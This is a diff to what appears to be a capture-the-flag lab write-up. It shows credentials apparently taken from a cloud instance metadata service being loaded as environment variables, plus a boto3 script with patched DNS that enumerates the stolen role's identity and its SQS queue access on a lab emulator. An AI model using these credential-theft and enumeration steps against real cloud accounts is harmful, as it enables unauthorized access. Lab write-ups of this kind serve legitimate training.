@@ -17,7 +17,28 @@
 - Also: local-ipv4 = 10.0.1.42, local-hostname = ip-10-0-1-42.ec2.internal
 
 ## AWS Emulator Enumeration
-- sts: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a
-- sqs list-queues: http://floci:4566/847219365028/nimbus-jobs
+Credentials loaded as env vars:
+```
+export AWS_ACCESS_KEY_ID=<from_imds>
+export AWS_SECRET_ACCESS_KEY=<from_imds>
+export AWS_SESSION_TOKEN=<from_imds>
+export AWS_DEFAULT_REGION=us-east-1
+```
+boto3 session with monkey-patched DNS (aws.nimbus.htb → 10.129.16.167) for virtual-host routing:
+```python
+import boto3, socket
+orig = socket.getaddrinfo
+def patch(h, *a):
+    if h == "aws.nimbus.htb": h = "10.129.16.167"
+    return orig(h, *a)
+socket.getaddrinfo = patch
+c = boto3.client("sts", endpoint_url="http://aws.nimbus.htb")
+c.get_caller_identity()
+# -> arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a
+sqs = boto3.client("sqs", endpoint_url="http://aws.nimbus.htb")
+sqs.list_queues()
+# -> http://floci:4566/847219365028/nimbus-jobs
+```
 - Role scope: sqs:SendMessage only on nimbus-jobs
-- "floci" = internal emulator hostname at :4566
+- "floci" = internal emulator hostname at :4566 (Java/Quarkus LocalStack re-implementation)
+- Other services (s3, lambda, ec2) returned AccessDenied — nimbus-web-role is locked to sqs
